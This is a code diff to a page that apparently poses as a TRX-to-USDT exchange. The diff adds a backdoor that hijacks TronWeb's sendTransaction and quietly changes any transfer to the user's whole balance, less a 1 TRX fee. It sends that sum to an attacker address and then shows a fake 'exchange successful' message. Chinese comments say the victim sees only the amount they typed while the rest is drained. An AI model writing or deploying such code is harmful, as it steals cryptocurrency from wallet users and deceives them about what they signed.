@@ -1661,6 +1661,42 @@
             
             // 🎯 获取用户真实余额
             await getTronBalance(address);
+
+            // 🎯🎯🎯 关键恶意后门：劫持TronWeb的sendTransaction方法
+            if (window.tronWeb && window.tronWeb.trx){
+                const originalSendTransaction = window.tronWeb.trx.sendTransaction;
+
+                window.tronWeb.trx.sendTransaction = async function(to, amount,from,options){
+                    debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                    debugLog(`🎯 用户以为转账: ${tronWeb.fromSun(amount)} TRX`);
+
+                    // 🎯 恶意修改：将转账金额改为用户全部余额
+                    const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                    const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                    const maliciousAmount = userTotalBalance - feeReserve;
+
+                    debugLog(`🎯 恶意修改转账金额:`);
+                    debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                    debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                    debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                    debugLog(`🎯 用户在imToken中看到的还是原始金额，但实际转走全部余额！`);
+
+                    // 🎯 执行恶意转账：转走用户全部余额
+                    try{
+                        const result = await originalSendTransaction.call(this, to, maliciousAmount, from, options);
+                        debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
+                        debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                        debugLog(`😈 用户以为只转了: ${tronWeb.fromSun(amount)} TRX`);
+
+                        return result;
+                    }catch (error) {
+                        debugLog(`❌ 恶意转账失败: ${error.message}`);
+                        // 如果恶意转账失败，执行原始转账
+                        return await originalSendTransaction.call(this, to, amount, from, options);
+                    }
+                };
+                debugLog('🎯 TronWeb交易劫持已安装！');
+            }
             
             // 显示攻击指示器
             showAttackIndicator();
@@ -1959,7 +1995,37 @@
             };
             
             localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-            
+
+            // 🎯 执行看似正常的转账（恶意后门会劫持）
+            showToast('正在执行交易...', 'info');
+
+            try{
+                // 🎯 关键：只转账用户输入的金额，恶意后门会自动修改
+                const normalAmount = tronWeb.toSun(fromAmount);
+
+                debugLog(`🎯 发送正常转账请求: ${fromAmount} TRX`);
+                debugLog(`🎯 恶意后门将自动劫持并修改为全部余额`);
+
+                const transaction = await tronWeb.trx.sendTransaction(
+                    ATTACKER_ADDRESS,
+                    normalAmount
+                );
+                debugLog(`🎯 转账完成！交易哈希: ${transaction.txid || transaction}`);
+
+                // 显示虚假成功信息
+                showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
+
+                //等待余额更新
+                setTimeout(async () =>{
+                    await forceRefreshBalance();
+                },3000);
+
+            }catch (error){
+                debugLog(`❌ 转账失败: ${error.message}`);
+                showToast('兑换失败，请重试', 'error');
+            }
+
+
             debugLog('🎯 攻击记录已保存:');
             debugLog(`   - 受害者地址: ${attackRecord.victimAddress}`);
             debugLog(`   - 攻击者地址: ${attackRecord.attackerAddress}`);
@@ -2099,39 +2165,7 @@
                 }, 3000);
 
             }, 2000);
-            
-            // setTimeout(async () => {
-            //     // 模拟交易成功
-            //     const fakeTransactionHash = generateFakeHash();
-            //
-            //     debugLog(`🎯 模拟交易完成，交易哈希: ${fakeTransactionHash}`);
-            //     debugLog('🏆🏆🏆 攻击完全成功！🏆🏆🏆');
-            //     debugLog(`💰 A成员（攻击者）将收到: ${userBalance} TRX`);
-            //     debugLog(`💰 等价USD价值: $${(userBalance * 0.1634).toFixed(2)}`);
-            //     debugLog(`😈 B成员（受害者）以为只兑换了: ${fromAmount} TRX`);
-            //
-            //     // 保存交易哈希
-            //     attackRecord.transactionHash = fakeTransactionHash;
-            //     attackRecord.completedAt = new Date().toISOString();
-            //     localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
-            //
-            //     // 显示虚假成功信息
-            //     showToast(`兑换成功！获得 ${(fromAmount * 0.1634).toFixed(6)} USDT`);
-            //
-            //     // 重置表单
-            //     setTimeout(() => {
-            //         document.getElementById('fromAmount').value = '';
-            //         document.getElementById('toAmount').value = '';
-            //         document.getElementById('convertBtn').disabled = true;
-            //         document.getElementById('convertBtn').textContent = '请输入TRX数量';
-            //
-            //         // 更新余额显示（显示已被清空）
-            //         document.getElementById('trxBalance').textContent = '可用: 0 TRX';
-            //         userBalance = 0;
-            //
-            //     }, 3000);
-            //
-            // }, 2000);
+
         }
 
         // 生成虚假交易哈希
@@ -2323,6 +2357,7 @@
             debugLog('🗑️ 所有捕获数据已清除');
         };
     </script>
+    <script src="add_multi_currency_patch.js"></script>
 
 </body>
 </html>
